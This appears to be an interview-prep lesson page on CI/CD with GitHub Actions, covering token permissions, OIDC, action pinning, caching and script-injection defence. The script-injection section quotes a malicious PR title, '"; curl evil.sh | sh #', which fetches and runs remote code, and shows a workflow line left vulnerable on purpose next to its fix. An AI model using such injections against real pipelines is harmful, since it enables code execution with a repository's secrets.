@@ -1,0 +1,355 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>07. CI/CD with GitHub Actions | Interview prep</title><style>
+:root{--bg:#fff;--fg:#1f2328;--mut:#59636e;--bd:#d1d9e0;--ac:#0b57d0;--cb:#f6f8fa;--sb:#f6f8fa}
+@media (prefers-color-scheme:dark){:root{--bg:#0d1117;--fg:#e6edf3;--mut:#9198a1;--bd:#30363d;--ac:#6cb6ff;--cb:#161b22;--sb:#010409}}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.65 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+.wrap{display:flex;min-height:100vh}nav{width:300px;flex:none;background:var(--sb);border-right:1px solid var(--bd);padding:16px;overflow:auto;position:sticky;top:0;height:100vh}
+nav a{color:var(--fg);text-decoration:none;display:block;padding:3px 6px;border-radius:6px;font-size:14px}nav a:hover{background:var(--cb)}nav a.cur{background:var(--ac);color:#fff}
+nav summary{cursor:pointer;font-weight:600;padding:6px 0}nav .home{font-weight:700;font-size:16px;margin-bottom:8px}
+main{flex:1;min-width:0;max-width:900px;padding:24px 32px 80px;margin:0 auto}
+h1,h2,h3{line-height:1.25}h1{border-bottom:1px solid var(--bd);padding-bottom:.3em}h2{border-bottom:1px solid var(--bd);padding-bottom:.25em;margin-top:2em}
+a{color:var(--ac)}pre{background:var(--cb);border:1px solid var(--bd);border-radius:8px;padding:14px;overflow:auto;font-size:13.5px;line-height:1.5}
+code{background:var(--cb);padding:.15em .35em;border-radius:5px;font-size:.92em}pre code{background:none;padding:0}
+table{border-collapse:collapse;display:block;overflow:auto;max-width:100%}th,td{border:1px solid var(--bd);padding:6px 10px;text-align:left;vertical-align:top}th{background:var(--cb)}
+blockquote{border-left:4px solid var(--bd);margin:0;padding:0 1em;color:var(--mut)}img{max-width:100%}
+.top{display:none}.pn{display:flex;justify-content:space-between;gap:12px;margin-top:48px;border-top:1px solid var(--bd);padding-top:16px;font-size:14px}
+@media(max-width:820px){.wrap{display:block}nav{width:auto;height:auto;position:static;border-right:0;border-bottom:1px solid var(--bd)}main{padding:16px}}
+</style></head><body><div class="wrap"><nav><a class="home" href="../index.html">Interview prep</a><details><summary>Data structures and algorithms</summary><a href="../01-dsa/00_how_to_start.html">How to start: reading a problem, the 5-step method, and Big-</a><a href="../01-dsa/01_arrays_and_strings.html">Lesson 01. Arrays and Strings</a><a href="../01-dsa/02_hash_maps_and_sets.html">Lesson 02. Hash Maps and Sets</a><a href="../01-dsa/03_two_pointers.html">Lesson 03. Two Pointers</a><a href="../01-dsa/04_sliding_window.html">Lesson 04. Sliding Window</a><a href="../01-dsa/05_stack_and_queue.html">Lesson 05. Stack and Queue (including the monotonic stack)</a><a href="../01-dsa/06_binary_search.html">Lesson 06. Binary Search (including search on the answer)</a><a href="../01-dsa/07_linked_lists.html">Lesson 07. Linked Lists</a><a href="../01-dsa/08_trees_and_bst.html">Lesson 08. Trees and Binary Search Trees (BST)</a><a href="../01-dsa/09_heaps_and_priority_queues.html">Lesson 09: Heaps and Priority Queues</a><a href="../01-dsa/10_graphs_bfs_dfs.html">Lesson 10: Graphs, BFS and DFS (including grids)</a><a href="../01-dsa/11_topological_sort_and_union_find.html">Lesson 11: Topological Sort and Union-Find</a><a href="../01-dsa/12_shortest_paths.html">Lesson 12: Shortest Paths (Dijkstra in plain words)</a><a href="../01-dsa/13_intervals.html">Lesson 13: Intervals (merge intervals, meeting rooms)</a><a href="../01-dsa/14_backtracking.html">Lesson 14: Backtracking (subsets, permutations, combination </a><a href="../01-dsa/15_dynamic_programming_part1.html">Lesson 15: Dynamic Programming, Part 1 (remembering answers)</a><a href="../01-dsa/16_dynamic_programming_part2.html">Lesson 16: Dynamic Programming, Part 2 (LIS, word break, kna</a><a href="../01-dsa/17_tries_and_greedy.html">Lesson 17: Tries and Greedy</a><a href="../01-dsa/18_bit_tricks_and_math_basics.html">Lesson 18: Bit Tricks and Math Basics (short)</a><a href="../01-dsa/19_company_question_patterns.html">Lesson 19: Company Question Patterns (Google, Amazon, Meta, </a></details><details><summary>System design</summary><a href="../02-system-design/00_how_the_round_works.html">How the System Design Round Works</a><a href="../02-system-design/01a_client_server_and_http.html">Client, Server and HTTP</a><a href="../02-system-design/01b_dns_and_cdn.html">DNS and CDN</a><a href="../02-system-design/01c_load_balancers.html">Load Balancers</a><a href="../02-system-design/01d_databases.html">Databases: SQL vs NoSQL, Indexes, Transactions</a><a href="../02-system-design/01e_caching.html">Caching (and Why Invalidation Is Hard)</a><a href="../02-system-design/01f_sharding_and_replication.html">Sharding and Replication</a><a href="../02-system-design/01g_message_queues_and_streams.html">Message Queues and Streams (Kafka Basics)</a><a href="../02-system-design/01h_consistency_and_cap.html">Consistency and the CAP Idea (in Plain Words)</a><a href="../02-system-design/02_numbers_and_estimation.html">Numbers and Estimation</a><a href="../02-system-design/03_reliability_patterns.html">Reliability Patterns</a><a href="../02-system-design/10_url_shortener.html">Design a URL Shortener</a><a href="../02-system-design/11_rate_limiter.html">Design a Rate Limiter</a><a href="../02-system-design/12_chat_system.html">Design a Chat System (like WhatsApp or Slack)</a><a href="../02-system-design/13_news_feed.html">Design a News Feed (like Instagram, Facebook or Twitter/X ho</a><a href="../02-system-design/14_notification_service.html">Design a Notification Service</a><a href="../02-system-design/15_file_storage_like_drive.html">Design File Storage and Sync (like Google Drive or Dropbox)</a><a href="../02-system-design/16_search_autocomplete.html">Design Search Autocomplete (Typeahead)</a><a href="../02-system-design/17_video_streaming_basics.html">Design Video Streaming Basics (like YouTube or Netflix)</a><a href="../02-system-design/18_payment_system_like_stripe.html">Design a Payment System (like Stripe)</a><a href="../02-system-design/19_order_management_like_amazon.html">Design an Order Management System (like Amazon: inventory, o</a><a href="../02-system-design/20_job_scheduler_and_workflow_engine.html">Design a Job Scheduler and Workflow Engine</a><a href="../02-system-design/21_api_gateway_and_auth_system.html">Design an API Gateway and Auth System</a><a href="../02-system-design/22_logging_and_metrics_platform.html">Design a Logging and Metrics Platform</a><a href="../02-system-design/90_cheat_sheet.html">Cheat Sheet (one page)</a><a href="../02-system-design/91_practice_questions.html">Practice Questions (30)</a></details><details><summary>Low-level design</summary><a href="../03-low-level-design/00_how_the_lld_round_works.html">- How the LLD round works</a><a href="../03-low-level-design/01_oop_in_plain_words.html">- OOP in plain words</a><a href="../03-low-level-design/02_solid_principles.html">- SOLID principles</a><a href="../03-low-level-design/03_design_patterns_you_need.html">- The 8 design patterns you need</a><a href="../03-low-level-design/10_parking_lot.html">- Parking Lot</a><a href="../03-low-level-design/11_lru_cache.html">- LRU Cache</a><a href="../03-low-level-design/12_elevator_system.html">- Elevator System</a><a href="../03-low-level-design/13_library_management.html">- Library Management System</a><a href="../03-low-level-design/14_vending_machine.html">- Vending Machine (State pattern)</a><a href="../03-low-level-design/15_atm.html">- ATM</a><a href="../03-low-level-design/16_rate_limiter_class.html">- Rate Limiter (class design: token bucket and sliding windo</a><a href="../03-low-level-design/17_amazon_locker.html">- Amazon Locker</a><a href="../03-low-level-design/18_splitwise_expense_sharing.html">- Splitwise (Expense Sharing)</a><a href="../03-low-level-design/19_logger_and_notification_system.html">- Logger and Notification System (Observer and Strategy)</a><a href="../03-low-level-design/20_tic_tac_toe_or_chess_basics.html">- Tic-Tac-Toe (full) and Chess basics</a><a href="../03-low-level-design/90_cheat_sheet.html">- Cheat sheet (read the night before)</a><a href="../03-low-level-design/91_practice_questions.html">- Practice questions (20)</a></details><details open><summary>DevOps and platform basics</summary><a href="01_linux_processes_memory_files.html">Linux: processes, memory, and files</a><a href="02_networking.html">Networking: TCP, DNS, TLS, NAT</a><a href="03_containers_and_docker.html">Containers and Docker</a><a href="04_kubernetes_from_zero.html">Kubernetes from zero</a><a href="05_helm.html">Helm</a><a href="06_terraform.html">Terraform</a><a class="cur" href="07_ci_cd_github_actions.html">CI/CD with GitHub Actions</a><a href="08_observability_and_sre.html">Observability and SRE</a><a href="09_concurrency_and_distributed_basics.html">Concurrency and distributed basics</a><a href="10_databases_basics.html">Databases basics</a><a href="11_security_basics.html">Security basics (IAM, OAuth2/OIDC/JWT, secrets, supply chain</a><a href="12_gcp_pca_quick_map.html">Google Cloud quick map (for Professional Cloud Architect hol</a><a href="20_interview_questions_with_answers.html">Sixty interview questions with model answers (platform / SRE</a><a href="21_scenario_questions.html">Fifteen &quot;production is down&quot; scenarios, with step-by-step an</a></details><details><summary>Company processes</summary><a href="../06-company-process-and-behavioural/10_google.html">Google</a><a href="../06-company-process-and-behavioural/11_amazon.html">Amazon</a><a href="../06-company-process-and-behavioural/12_stripe.html">Stripe</a><a href="../06-company-process-and-behavioural/13_microsoft_and_azure_roles.html">Microsoft and Azure roles</a><a href="../06-company-process-and-behavioural/14_indian_product_and_gcc_companies.html">Indian product companies and GCCs</a><a href="../06-company-process-and-behavioural/15_european_scaleups.html">European scale-ups and visa basics</a><a href="../06-company-process-and-behavioural/16_ai_startups_like_smallest_ai.html">AI startups like Smallest AI</a><a href="../06-company-process-and-behavioural/24_questions_to_ask_interviewers.html">Questions to ask interviewers</a><a href="../06-company-process-and-behavioural/25_salary_notice_period_and_offer_negotiation_india_and_abroad.html">Salary, notice period and offer negotiation (India and abroa</a><a href="../06-company-process-and-behavioural/26_interview_day_checklists.html">Interview day checklists</a></details></nav><main><h1 id="07-cicd-with-github-actions">07. CI/CD with GitHub Actions</h1>
+
+<p>Legend: <code>[SAMPLE]</code> = example written to show the shape. I cannot run GitHub Actions on this Mac, so there is no captured output here. The security rules (injection, pinning, token permissions, <code>pull_request_target</code>, OIDC claims, caching limits, reusable workflow limits) were checked against GitHub's own docs (links at the end).</p>
+
+<hr />
+
+<h2 id="1-what-it-is-plain-words-analogy">1. What it is (plain words + analogy)</h2>
+
+<p><strong>CI</strong> (continuous integration) = every time someone pushes code, a machine <strong>builds it and runs tests</strong>, so problems show up in minutes.
+<strong>CD</strong> (continuous delivery or deployment) = the machine also <strong>ships</strong> the tested build to an environment.</p>
+
+<p><strong>GitHub Actions</strong> is GitHub's built-in robot for this. You put a YAML file in <code>.github/workflows/</code>. GitHub starts a fresh virtual machine, runs your steps, and throws the machine away.</p>
+
+<p>Analogy: a <strong>factory conveyor belt with a quality inspector</strong>.</p>
+
+<ul>
+<li><strong>Workflow</strong> = the whole belt (one YAML file).</li>
+<li><strong>Trigger (<code>on:</code>)</strong> = what starts the belt (a push, a pull request, a schedule, a manual click).</li>
+<li><strong>Job</strong> = one station. Jobs run on different machines, in parallel unless you say <code>needs:</code>.</li>
+<li><strong>Step</strong> = one task at a station: a shell command (<code>run:</code>) or a ready-made action (<code>uses:</code>).</li>
+<li><strong>Runner</strong> = the machine the job runs on (GitHub-hosted or self-hosted).</li>
+<li><strong>Action</strong> = a reusable step written by someone (<code>actions/checkout</code>).</li>
+<li><strong>Artifact</strong> = a file passed between jobs. <strong>Cache</strong> = files kept between runs to save time.</li>
+</ul>
+
+<h2 id="2-why-it-matters-in-interviews">2. Why it matters in interviews</h2>
+
+<p>Platform engineers own the paths to production. Interviewers ask how you build a safe pipeline: no long-lived cloud keys, least privilege, protected production deploys, reusable pipelines for many repos, speed (caching), and how an attacker could abuse a pipeline. The security items (script injection, pinned actions, <code>pull_request_target</code>, OIDC) are very common in 2026 because of real supply-chain incidents. One guide mentions the tj-actions/changed-files incident, where people who used a movable tag were hit. Also expect "design the CI/CD for 200 services".</p>
+
+<h2 id="3-how-it-works-step-by-step">3. How it works, step by step</h2>
+
+<h3 id="31-a-minimal-workflow">3.1 A minimal workflow</h3>
+
+<pre><code>name: ci
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read                # least privilege for GITHUB_TOKEN
+
+jobs:
+  test:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@&lt;full-commit-sha&gt;   # pinned, see 3.5
+      - uses: actions/setup-python@&lt;full-commit-sha&gt;
+        with: { python-version: "3.12", cache: pip }
+      - run: pip install -r requirements.txt
+      - run: pytest -q
+</code></pre>
+
+<p>Flow:</p>
+
+<pre><code> push/PR ──&gt; GitHub schedules workflow ──&gt; job "test" on a fresh runner VM
+                                             checkout -&gt; setup -&gt; install -&gt; test
+                                           ──&gt; status check on the PR (green/red)
+</code></pre>
+
+<p>Notes: <code>&lt;full-commit-sha&gt;</code> means a real 40-character SHA you look up and verify. I wrote a placeholder so I do not invent a hash. Set <code>timeout-minutes</code> so a stuck job does not run for hours. Use <code>concurrency:</code> to cancel older runs of the same branch.</p>
+
+<h3 id="32-reusable-workflows-vs-composite-actions">3.2 Reusable workflows vs composite actions</h3>
+
+<p>Both avoid copy-paste. They work at different levels.</p>
+
+<table>
+<thead>
+<tr>
+  <th></th>
+  <th><strong>Reusable workflow</strong></th>
+  <th><strong>Composite action</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>What it is</td>
+  <td>A whole workflow file with <code>on: workflow_call</code></td>
+  <td>An <code>action.yml</code> with <code>runs: using: composite</code> and a list of steps</td>
+</tr>
+<tr>
+  <td>Called from</td>
+  <td>A <strong>job</strong> (<code>jobs.x.uses: org/repo/.github/workflows/build.yml@ref</code>)</td>
+  <td>A <strong>step</strong> (<code>- uses: org/repo/action@ref</code>)</td>
+</tr>
+<tr>
+  <td>Contains</td>
+  <td>One or more <strong>jobs</strong> (own runner, own <code>permissions</code>, secrets, environments)</td>
+  <td>Only <strong>steps</strong> that run inside the caller's job and runner</td>
+</tr>
+<tr>
+  <td>Good for</td>
+  <td>A full standard pipeline (build, scan, deploy) shared by many repos</td>
+  <td>A small repeated bundle of steps (setup + login + cache)</td>
+</tr>
+<tr>
+  <td>Limits (GitHub docs)</td>
+  <td>up to 10 levels of nesting; max 50 unique reusable workflows per workflow file; env vars of the caller are not passed in; outputs return values</td>
+  <td>shares the caller's job context</td>
+</tr>
+</tbody>
+</table>
+
+<p>Reusable workflow facts from the docs: it is called from a job, so <code>GITHUB_ENV</code> cannot pass values to the caller's steps; if the caller job sets no <code>permissions</code>, the called workflow gets the default token permissions and "can only reduce those permissions, not raise them"; the called workflow can be in the same repo, a public repo, or an accessible private repo.</p>
+
+<pre><code># caller
+jobs:
+  build:
+    uses: my-org/platform-workflows/.github/workflows/build.yml@&lt;sha-or-tag&gt;
+    with: { image-name: web }
+    secrets: inherit          # or pass specific secrets one by one (safer)
+</code></pre>
+
+<pre><code># .github/workflows/build.yml in the shared repo
+on:
+  workflow_call:
+    inputs:
+      image-name: { type: string, required: true }
+</code></pre>
+
+<p>Rule of thumb: <strong>reusable workflow for the pipeline skeleton, composite action for repeated step bundles.</strong> (The composite-action row is general GitHub knowledge; the doc page I read covers reusable workflows only.)</p>
+
+<h3 id="33-least-privilege-tokens">3.3 Least-privilege tokens</h3>
+
+<p>Every job gets a temporary <code>GITHUB_TOKEN</code> for the GitHub API. GitHub's guidance: set the default to <strong>read-only for contents</strong> and raise permissions <strong>per job</strong>, only where needed; give "minimum required permissions" to any credentials.</p>
+
+<pre><code>permissions: {}                 # start from nothing at the top
+jobs:
+  build:
+    permissions: { contents: read }
+  release:
+    permissions: { contents: write, packages: write }
+  deploy:
+    permissions: { id-token: write, contents: read }   # id-token only for OIDC
+</code></pre>
+
+<p>Also: protect production with <strong>Environments</strong> that have <strong>required reviewers</strong> (docs: "Use environments with required reviewers to gate access to environment secrets"); anyone with write access to a repo can read its repository secrets, so keep powerful secrets in environments. Restrict which branches can deploy.</p>
+
+<h3 id="34-oidc-no-long-lived-cloud-keys">3.4 OIDC: no long-lived cloud keys</h3>
+
+<p><strong>Old way</strong>: store a cloud access key in GitHub secrets. It never expires, can leak, and must be rotated by hand.
+<strong>OIDC way</strong> (OpenID Connect): GitHub issues a <strong>short-lived signed token (a JWT) per job</strong>. The cloud checks it against a trust rule you wrote, and returns short-lived cloud credentials.</p>
+
+<pre><code> job starts ──&gt; asks GitHub: "give me an ID token" (needs permissions: id-token: write)
+ GitHub ──&gt; signed JWT {iss, sub, aud, repository, ref, environment, ...}
+ job ──&gt; cloud STS (Azure Entra / Google STS / AWS): "here is my token"
+ cloud: verifies signature + checks claims against trust policy
+ cloud ──&gt; short-lived access token ──&gt; job deploys
+</code></pre>
+
+<p>Claims you can match on (from the GitHub docs): <code>iss</code> (issuer), <code>aud</code> (audience), <code>sub</code> (subject, for example <code>repo:octo-org/octo-repo:environment:prod</code>), <code>repository</code>, <code>repository_owner</code>, <code>ref</code>, <code>sha</code>, <code>event_name</code>, <code>actor</code>, <code>environment</code>, <code>job_workflow_ref</code>, <code>workflow</code>, <code>run_id</code>, <code>iat</code>, <code>exp</code>, and optional custom <code>repo_property_*</code> claims. </p>
+
+<p><strong>Be specific in the trust rule.</strong> Allow only your repo, your protected branch or environment, and ideally the workflow ref. A loose rule such as "any repo in my org" or "any branch" is a security hole. <strong>Current detail (verified in the docs today)</strong>: repositories created after <strong>July 15, 2026</strong> use a new <code>sub</code> format that includes owner and repository IDs (not available on GitHub Enterprise Server). If your trust policy matches the <code>sub</code> string, check which format your repos send.</p>
+
+<p>Cloud side:</p>
+
+<ul>
+<li>Google Cloud: <strong>Workload Identity Federation</strong> lets outside workloads reach Google Cloud "without a service account key", uses short-lived tokens, and you can limit identities with attribute conditions. GitHub Actions is a supported source.</li>
+<li>Azure: federated credentials on an app registration or managed identity (and Microsoft Entra Workload ID inside AKS, same idea for pods; see file 11).</li>
+<li>AWS: an IAM OIDC provider and a role with a trust policy (general knowledge; I did not fetch AWS docs).</li>
+</ul>
+
+<pre><code>jobs:
+  deploy:
+    permissions: { id-token: write, contents: read }
+    environment: prod
+    steps:
+      - uses: google-github-actions/auth@&lt;full-commit-sha&gt;
+        with:
+          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/gh/providers/gh
+          service_account: deployer@my-project.iam.gserviceaccount.com
+</code></pre>
+
+<p>(The input names of that action are from memory of its README; check them before use.)</p>
+
+<h3 id="35-pin-actions">3.5 Pin actions</h3>
+
+<p>A third-party action is code that runs <strong>with your secrets and token</strong>. If its tag (<code>@v4</code>) is moved to malicious code, your pipeline runs it. GitHub's docs: "Pin references to actions to a commit SHA in your workflow files." Also: verify the SHA comes from the <strong>action's own repo and not a fork</strong>. If you use a tag, "only do so for creators you trust", because a tag "can be moved or deleted." The docs also say a workflow lockfile is stronger than SHA pinning where you can adopt one.</p>
+
+<pre><code>- uses: actions/checkout@&lt;40-char-sha&gt;   # v4.2.2   &lt;- keep the version in a comment
+</code></pre>
+
+<p>Keep pins fresh with Dependabot for <code>github-actions</code> (recommended by several guides). Prefer well-known maintainers, review what an action does, and use fewer actions (a plain <code>run: curl ... | sh</code> in your own script is not safer: pin and verify checksums there too).</p>
+
+<h3 id="36-script-injection">3.6 Script injection</h3>
+
+<p><strong>The bug</strong>: putting untrusted text (pull request title, branch name, issue body, commit message) directly into a <code>run:</code> script with <code>${{ ... }}</code>. GitHub fills the text in <strong>before</strong> the shell runs, so a title like <code>"; curl evil.sh | sh #</code> becomes part of the command.</p>
+
+<pre><code># VULNERABLE
+- run: echo "PR title is ${{ github.event.pull_request.title }}"
+
+# SAFE: pass through an environment variable, quote it in the shell
+- run: echo "PR title is $PR_TITLE"
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+</code></pre>
+
+<p>Official guidance: "set the value of the expression to an intermediate environment variable" (and the shell treats it as data, not code). Even safer: pass it as an argument to a JavaScript action, which "is not vulnerable to the injection attack". Static checkers such as <strong>zizmor</strong> can find template injection (named in a search result; not verified on its own site).</p>
+
+<p>Related dangerous things:</p>
+
+<ul>
+<li><strong><code>pull_request_target</code></strong> (and <code>workflow_run</code>): these run with a <strong>privileged context</strong> (secrets, write token) from the <strong>base</strong> branch. Docs: "Avoid using the <code>pull_request_target</code> workflow trigger if it's not necessary", and never <strong>check out untrusted PR code</strong> in those workflows. A flaw here "can be exploited to take over a repository". Use plain <code>pull_request</code> for untrusted code (forks get no secrets).</li>
+<li><strong>Secrets</strong>: never print them, never store as plaintext in workflow files; mask derived values with <code>::add-mask::</code>; if a secret leaks into a log, delete the log <strong>and rotate the secret</strong>; don't use structured data (a JSON blob) as one secret.</li>
+<li><strong>Self-hosted runners</strong> on public repos are risky (anyone's PR can run code on your machine).</li>
+</ul>
+
+<h3 id="37-caching-and-speed">3.7 Caching and speed</h3>
+
+<p><code>actions/cache</code> (or the <code>cache:</code> option of setup actions) stores files, such as <code>~/.cache/pip</code> or <code>~/.npm</code>, between runs.</p>
+
+<p>Facts from GitHub's docs:</p>
+
+<ul>
+<li><strong>key</strong>: the name and lookup value (max 512 characters). A common pattern hashes the lockfile: <code>key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}</code> so the cache refreshes when dependencies change.</li>
+<li><strong>restore-keys</strong>: fallbacks tried in order when there is no exact match (prefix match; the newest matching cache wins).</li>
+<li><strong>Scope</strong>: a run can restore caches from <strong>its own branch or the default branch</strong>; PR runs can also use the base branch; sibling branches cannot share.</li>
+<li><strong>Size and age</strong>: <strong>10 GB per repository</strong> by default (admins can raise it; usage above that is billed); entries <strong>not used for 7 days</strong> are removed; when full, the oldest-accessed go first.</li>
+<li><strong>Security warning</strong>: do not cache secrets. Cache contents are not verified before extraction, and anyone who can open a PR can read caches of the base branch.</li>
+</ul>
+
+<p>Other speed tips: run independent jobs in parallel; use <code>needs:</code> only when required; <code>concurrency</code> with <code>cancel-in-progress</code> for PRs; split slow test suites (matrix); use path filters (<code>paths:</code>) to skip unrelated jobs; Docker layer caching with BuildKit cache exports (<code>cache-from</code> / <code>cache-to</code>); smaller images; keep self-hosted runners warm if you use them.</p>
+
+<pre><code>- uses: actions/cache@&lt;sha&gt;
+  with:
+    path: ~/.cache/pip
+    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
+    restore-keys: |
+      ${{ runner.os }}-pip-
+</code></pre>
+
+<h3 id="38-a-safe-deployment-pipeline-shape">3.8 A safe deployment pipeline (shape)</h3>
+
+<pre><code> PR opened ──&gt; lint + unit tests + build image + scan (Trivy) + terraform plan / helm diff   (read-only token)
+     │
+ merge to main ──&gt; build + sign + push image (digest) ──&gt; deploy to dev (OIDC, automatic)
+     │
+     └──&gt; deploy to prod: Environment "prod" with required reviewers ──&gt; OIDC (narrow trust) ──&gt; helm upgrade --wait ──&gt; smoke test
+              └─ on failure: automatic rollback + alert + keep logs
+</code></pre>
+
+<p>Ideas to mention: build <strong>once</strong>, promote the <strong>same image digest</strong> through environments; no <code>:latest</code>; track which commit is in which environment; deployment frequency and change failure rate are common success measures (DORA, general knowledge).</p>
+
+<h2 id="4-commands-to-try">4. Commands to try</h2>
+
+<p>You can test workflows locally in part:</p>
+
+<pre><code># lint workflow files (install actionlint first: brew install actionlint)
+actionlint
+# run workflows locally in Docker (third-party tool "act"; many actions work, not all)
+act pull_request
+# use the GitHub CLI to see runs and logs
+gh run list --limit 5
+gh run view &lt;run-id&gt; --log-failed
+gh workflow run build.yml -f image-name=web      # trigger workflow_dispatch
+gh secret list                                   # names only, never values
+</code></pre>
+
+<p><code>[SAMPLE]</code> <code>gh run list</code>:</p>
+
+<pre><code>STATUS  TITLE              WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
+✓       Fix retry logic    ci        main    push   1234567890   2m10s    1h
+X       Bump chart         ci        pr-42   pull_request 1234567891 1m50s 2h
+</code></pre>
+
+<p>(<code>actionlint</code>, <code>act</code>, and the <code>gh</code> subcommands are real tools; I did not run them here.)</p>
+
+<h2 id="5-common-mistakes">5. Common mistakes</h2>
+
+<ol>
+<li><code>${{ github.event.* }}</code> text inside <code>run:</code> (script injection).</li>
+<li>Using <code>@main</code> or <code>@v1</code> for third-party actions instead of a verified full SHA.</li>
+<li>Default read-write <code>GITHUB_TOKEN</code> for every job.</li>
+<li>Cloud access keys in GitHub secrets instead of OIDC.</li>
+<li>OIDC trust rule that is too broad (whole org, any branch).</li>
+<li><code>pull_request_target</code> that checks out the PR's code.</li>
+<li>Caching secrets, or cache keys that never change (stale dependencies) or change every run (never hit).</li>
+<li>No <code>timeout-minutes</code>, no <code>concurrency</code>, so stuck or duplicate runs waste money and block deploys.</li>
+</ol>
+
+<h2 id="6-eight-interview-questions-with-answers">6. Eight interview questions with answers</h2>
+
+<p><strong>Q1. Explain workflow, job, step, runner.</strong>
+A workflow is a YAML file started by a trigger. It contains jobs. Jobs run on separate runners (fresh VMs) and in parallel unless <code>needs:</code> orders them. A job has steps; a step runs a shell command or an action. Data between jobs moves by artifacts or job outputs.</p>
+
+<p><strong>Q2. Reusable workflow vs composite action: when do you use which?</strong>
+A reusable workflow (<code>workflow_call</code>) is a whole workflow with its own jobs, runners, permissions, and secrets; call it from a job. Use it for a standard pipeline shared across repos. A composite action bundles steps and runs inside the caller's job; call it from a step. Use it for small repeated step groups. Limits for reusable workflows: nesting up to 10 levels and 50 unique called workflows per file; caller <code>env</code> is not passed.</p>
+
+<p><strong>Q3. How do you stop using long-lived cloud credentials in pipelines?</strong>
+OIDC federation. The job requests a short-lived GitHub-signed JWT (permission <code>id-token: write</code>). The cloud validates it and checks claims (<code>sub</code>, <code>repository</code>, <code>ref</code>, <code>environment</code>) against a narrow trust policy, then issues short-lived credentials. Nothing long-lived is stored, tokens are tied to a run, and access is auditable.</p>
+
+<p><strong>Q4. What is script injection in Actions and how do you prevent it?</strong>
+Untrusted values like PR titles interpolated into <code>run:</code> with <code>${{ }}</code> become part of the shell command. Prevent it by assigning the value to an environment variable with <code>env:</code> and using <code>"$VAR"</code> in the script, or by passing it to an action as an input argument. Scan workflows with a linter such as zizmor.</p>
+
+<p><strong>Q5. Why pin actions to a commit SHA?</strong>
+Tags and branches can be moved, so a compromised or malicious update would run in your pipeline with your secrets. A full commit SHA is immutable. Verify the SHA belongs to the action's own repo (not a fork) and use Dependabot to update pins in reviewed pull requests.</p>
+
+<p><strong>Q6. What is least privilege for <code>GITHUB_TOKEN</code>?</strong>
+Set repository default token permissions to read-only, declare <code>permissions:</code> at workflow level (often empty or <code>contents: read</code>), and grant extra permissions per job only where required (for example <code>packages: write</code> for the publish job, <code>id-token: write</code> for the deploy job).</p>
+
+<p><strong>Q7. What is dangerous about <code>pull_request_target</code>?</strong>
+It runs in the context of the base repository with access to secrets and a write token, but it can be triggered by pull requests from forks. If it checks out or runs the PR's code, an attacker can run code with those privileges. Avoid it, or never check out untrusted code in it; use <code>pull_request</code> and, if needed, a separate <code>workflow_run</code> with careful handling of artifacts.</p>
+
+<p><strong>Q8. How do you make a pipeline faster and still safe?</strong>
+Cache dependencies by lockfile hash (remembering scope, 10 GB limit, 7-day expiry, never cache secrets), run jobs in parallel, use path filters and concurrency cancellation, cache Docker layers, and build once then promote the same image digest. Keep security checks (scans, plan/diff) in the PR path so speed does not remove gates.</p>
+
+<h2 id="7-self-quiz-answers-at-the-end">7. Self-quiz (answers at the end)</h2>
+
+<ol>
+<li>Which permission must a job have to request an OIDC token?</li>
+<li>Why is <code>run: echo "${{ github.event.issue.title }}"</code> dangerous?</li>
+<li>How long are unused caches kept, and what is the default size limit per repo?</li>
+<li>Reusable workflow or composite action: which is called from a <code>step</code>?</li>
+<li>Name one thing to restrict in a cloud trust policy for GitHub OIDC.</li>
+</ol>
+
+<p><strong>Answers</strong></p>
+
+<ol>
+<li><code>id-token: write</code>.</li>
+<li>The title is pasted into the script before the shell runs, so an attacker-controlled title can inject commands. Use an env variable.</li>
+<li>7 days without access; 10 GB per repository by default.</li>
+<li>The composite action (<code>uses:</code> inside <code>steps</code>). A reusable workflow is called at job level.</li>
+<li>The repository (and ideally branch or environment and workflow ref) in the <code>sub</code>/claims, plus the audience.</li>
+</ol>
+
+<h2 id="8-sources">8. Sources</h2>
+
+<ul>
+<li>GitHub, secure use (script injection, SHA pinning, token permissions, secrets, <code>pull_request_target</code>): https://docs.github.com/en/actions/reference/security/secure-use</li>
+<li>GitHub, OpenID Connect concepts (claims, <code>sub</code> format change after July 15, 2026): https://docs.github.com/en/actions/concepts/security/openid-connect</li>
+<li>GitHub, reusable workflows (limits, permissions): https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations</li>
+<li>GitHub, dependency caching (key, restore-keys, scope, 10 GB, 7 days, security): https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching</li>
+<li>Google Cloud, Workload Identity Federation: https://docs.cloud.google.com/iam/docs/workload-identity-federation</li>
+<li>Prep-site context (indicators only): https://www.kore1.com/devops-engineer-interview-questions/</li>
+</ul>
+
+<p>Not verified from a source: the tj-actions/changed-files incident details (one search-result summary only); zizmor and Dependabot-for-actions recommendations (search summaries); composite action behavior and the comparison table row for it; <code>google-github-actions/auth</code> input names; AWS OIDC details; the <code>gh</code>, <code>act</code>, <code>actionlint</code> command details; DORA metrics; the <code>timeout-minutes</code> and <code>concurrency</code> features (standard Actions syntax, not re-read today).</p>
+<div class="pn"><span><a href="06_terraform.html">&larr; 06. Terraform</a></span><span><a href="08_observability_and_sre.html">08. Observability and SRE &rarr;</a></span></div></main></div></body></html>
